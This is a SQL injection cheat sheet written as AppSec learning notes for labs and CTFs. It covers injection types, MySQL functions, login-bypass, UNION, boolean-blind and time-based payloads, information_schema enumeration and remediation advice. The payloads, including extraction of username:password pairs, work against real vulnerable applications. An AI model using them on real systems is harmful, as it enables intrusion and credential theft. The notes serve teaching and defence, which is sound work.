# SQL Injection Cheat Sheet - AppSec Learning Notes

> Scope: use only in legal labs, CTFs, intentionally vulnerable local apps, or explicitly authorised targets. This sheet is written for learning and remediation. Most examples assume MySQL-style syntax, which matches many beginner web security labs.

## 1. Mental model

SQL Injection happens when user-controlled input is inserted into a SQL query in an unsafe way. The attacker can change the meaning of the query.

**Vulnerable idea:**

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

If `$username` is not safely parameterised, input can break out of the string and modify the query logic.

**Developer fix:** prepared statements / parameterised queries, not quote filtering.

---

## 2. Main SQLi types

| Type | How it behaves | What you usually look for | Example idea |
|---|---|---|---|
| In-band SQLi | Result or error comes back in the same response | Visible data, database errors, UNION output | Error-based, UNION-based |
| Error-based SQLi | Database errors reveal information | Syntax errors, table/column names in errors | Trigger controlled error |
| UNION-based SQLi | Uses `UNION SELECT` to combine attacker-selected data with original query output | Number of columns, text-compatible column | `UNION SELECT NULL,NULL,database()` |
| Blind boolean-based SQLi | Page changes based on true/false condition, but data is not directly shown | Different status, text, redirect, length, login result | `AND 1=1` vs `AND 1=2` |
| Blind time-based SQLi | Response is delayed when a condition is true | Delay/no delay | `IF(condition,SLEEP(5),0)` |
| Out-of-band SQLi | Database causes external DNS/HTTP interaction | Callback to a controlled lab listener | Use only in authorised labs |

---

## 3. Core SQL keywords and functions

| Keyword / function | Meaning | Small example |
|---|---|---|
| `SELECT` | Choose data to return | `SELECT username FROM users` |
| `FROM` | Choose table/source | `FROM users` |
| `WHERE` | Filter rows | `WHERE id = 1` |
| `AND` / `OR` | Combine conditions | `WHERE role='admin' OR 1=1` |
| `LIKE` | Pattern matching | `name LIKE 'adm%'` |
| `%` | Any number of characters in `LIKE` | `'admin%'` |
| `_` | Exactly one character in `LIKE` | `'sql______'` |
| `ORDER BY` | Sort results, often used to find column count | `ORDER BY 3` |
| `LIMIT` / `OFFSET` | Return a specific row/page | `LIMIT 1 OFFSET 0` |
| `UNION SELECT` | Combine results from two `SELECT` queries | `UNION SELECT NULL,NULL` |
| `NULL` | Useful placeholder while testing column count/types | `UNION SELECT NULL,NULL,NULL` |
| `database()` | Current database name in MySQL | `SELECT database()` |
| `user()` | Current DB user in MySQL | `SELECT user()` |
| `version()` | DB version in MySQL | `SELECT version()` |
| `length()` | String length | `length(database())=9` |
| `substring()` / `substr()` | Extract part of a string | `substring(database(),1,1)='s'` |
| `ascii()` | ASCII code of character | `ascii(substring(database(),1,1))=115` |
| `concat()` | Join strings | `concat(username,':',password)` |
| `group_concat()` | Join many rows into one string | `group_concat(table_name)` |
| `SLEEP(n)` | Delay response for `n` seconds | `SLEEP(5)` |
| `IF(condition,a,b)` | If true return `a`, else `b` | `IF(1=1,SLEEP(5),0)` |

Important: `_` and `%` work as wildcards only with `LIKE`, not with `=`.

```sql
-- Wrong if you mean wildcard:
table_schema = 'sql______'

-- Correct wildcard version:
table_schema LIKE 'sql______'
```

---

## 4. Useful comments and string breakers

| Syntax | Meaning / note |
|---|---|
| `'` | Breaks out of a single-quoted string context |
| `"` | Breaks out of a double-quoted string context, if used |
| `-- -` | MySQL-style line comment; the space after `--` matters |
| `#` | MySQL line comment |
| `/* comment */` | Block comment |

Common ending:

```sql
' OR 1=1 -- -
```

URL encoded version of common characters:

| Character | Encoded |
|---|---|
| space | `%20` |
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `-- -` | `--%20-` |

---

## 5. Login bypass pattern

Goal: change login query logic so the password check is bypassed.

Example vulnerable query:

```sql
SELECT * FROM users WHERE username = '$u' AND password = '$p';
```

Example lab payload:

```sql
admin' OR '1'='1' -- -
```

Resulting idea:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- -' AND password = 'anything';
```

Why it works in vulnerable apps: `OR '1'='1'` is always true and the rest of the query is commented out.

Developer fix: parameterised query, neutral login errors, rate limiting, logging, MFA where appropriate.

---

## 6. UNION-based SQLi workflow

### Step 1 - Find number of columns

Using `ORDER BY`:

```sql
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -
```

When the page breaks at `ORDER BY 4`, the original query probably has 3 columns.

Using `UNION SELECT NULL`:

```sql
' UNION SELECT NULL -- -
' UNION SELECT NULL,NULL -- -
' UNION SELECT NULL,NULL,NULL -- -
```

### Step 2 - Find a text-compatible visible column

```sql
' UNION SELECT NULL,'test',NULL -- -
```

If `test` appears in the response, that column is printable.

### Step 3 - Extract lab metadata

Current database:

```sql
' UNION SELECT NULL,database(),NULL -- -
```

Tables in current database:

```sql
' UNION SELECT NULL,table_name,NULL
FROM information_schema.tables
WHERE table_schema = database() -- -
```

Columns in a known table:

```sql
' UNION SELECT NULL,column_name,NULL
FROM information_schema.columns
WHERE table_schema = database()
AND table_name = 'users' -- -
```

Example: find columns starting with `i`:

```sql
' UNION SELECT NULL,column_name,NULL
FROM information_schema.columns
WHERE table_schema='sqli_three'
AND table_name='users'
AND column_name LIKE 'i%' -- -
```

Extract two columns together:

```sql
' UNION SELECT NULL,concat(username,':',password),NULL FROM users -- -
```

Rule: `UNION SELECT` must return the same number of columns as the original query, with compatible types.

---

## 7. Boolean-based blind SQLi

Use when data is not printed, but the page behaves differently for true and false conditions.

Baseline checks:

```sql
' AND 1=1 -- -
' AND 1=2 -- -
```

If the responses differ, you can ask yes/no questions.

Find database length:

```sql
' AND length(database())=9 -- -
```

Find first character:

```sql
' AND substring(database(),1,1)='s' -- -
```

Find first character with ASCII:

```sql
' AND ascii(substring(database(),1,1))=115 -- -
```

Find table name with pattern:

```sql
' AND (SELECT table_name FROM information_schema.tables
WHERE table_schema=database()
LIMIT 1 OFFSET 0) LIKE 'u%' -- -
```

---

## 8. Time-based blind SQLi

Use when the page does not visibly change, but you can measure delay.

Baseline:

```sql
' AND SLEEP(5) -- -
```

Conditional delay:

```sql
' AND IF(1=1,SLEEP(5),0) -- -
' AND IF(1=2,SLEEP(5),0) -- -
```

Check database prefix:

```sql
' AND IF((SELECT database()) LIKE 'sql%',SLEEP(5),0) -- -
```

Check database length:

```sql
' AND IF(length(database())=9,SLEEP(5),0) -- -
```

Check character by position:

```sql
' AND IF(substring(database(),1,1)='s',SLEEP(5),0) -- -
```

Using `information_schema` with `LIKE`:

```sql
' AND IF(EXISTS(
  SELECT 1 FROM information_schema.tables
  WHERE table_schema LIKE 'sql______'
),SLEEP(5),0) -- -
```

Remember: if you use `_` as a wildcard, use `LIKE`, not `=`.

---

## 9. Information schema quick reference

| Goal | Table | Useful columns |
|---|---|---|
| List databases/schemas | `information_schema.schemata` | `schema_name` |
| List tables | `information_schema.tables` | `table_schema`, `table_name` |
| List columns | `information_schema.columns` | `table_schema`, `table_name`, `column_name`, `data_type` |

List schemas:

```sql
SELECT schema_name FROM information_schema.schemata;
```

List tables in database:

```sql
SELECT table_name FROM information_schema.tables
WHERE table_schema='sqli_three';
```

List columns in table:

```sql
SELECT column_name FROM information_schema.columns
WHERE table_schema='sqli_three'
AND table_name='users';
```

---

## 10. Common mistakes

| Mistake | Why it fails | Fix |
|---|---|---|
| Using `COLUMN_NAME` from `information_schema.tables` | `COLUMN_NAME` exists in `information_schema.columns`, not `tables` | Use `information_schema.columns` |
| Using `_` with `=` | `_` is wildcard only in `LIKE` | Use `LIKE 'sql______'` |
| Forgetting same column count in `UNION` | `UNION SELECT` must match original column count | Test with `NULL,NULL,...` |
| Putting text into non-text column | DB may reject incompatible type | Find text-compatible column first |
| Missing space after `--` | MySQL may not treat it as comment | Use `-- -` |
| Not URL-encoding payload | Browser/server may change characters | Encode spaces, quotes, `#` |
| Going straight to payloads | No mental model | Identify source, sink/query, impact, fix |

---

## 11. Safe testing checklist

For every SQLi lab, answer:

- What parameter or input did I control?
- Was it in URL, body, cookie, header, or referrer?
- Where did it enter the SQL query?
- Was the query in `SELECT`, `WHERE`, `ORDER BY`, `INSERT`, or another context?
- Did I get visible output, boolean difference, delay, or external callback?
- What was the real impact?
- How would a developer fix it?
- What regression test would prevent it from coming back?

---

## 12. Remediation cheat sheet

| Risk | Better approach |
|---|---|
| String concatenation in SQL | Prepared statements / parameterised queries |
| Dynamic table/column names | Allowlist allowed values |
| Detailed DB errors to users | Generic errors to users, detailed logs internally |
| Overprivileged DB account | Least privilege DB user |
| No detection | Log suspicious query patterns and failed validation |
| Regression risk | Add security tests for authz and injection cases |

Example parameterised style idea:

```js
// Safer idea: parameterised query
await db.query('SELECT * FROM users WHERE username = ? AND password_hash = ?', [username, hash]);
```

---

## 13. Mini memory cards

| Concept | One-line definition |
|---|---|
| SQLi | User input changes the meaning of a SQL query |
| UNION SQLi | Combines attacker-selected result with original query result |
| Boolean blind | True/false page difference leaks information |
| Time blind | Delay/no delay leaks information |
| `database()` | Current MySQL database name |
| `information_schema` | Metadata about schemas, tables and columns |
| `LIKE` | Pattern matching with `%` and `_` |
| `SLEEP()` | Creates delay for time-based testing |
| Prepared statement | SQL code and data are separated safely |
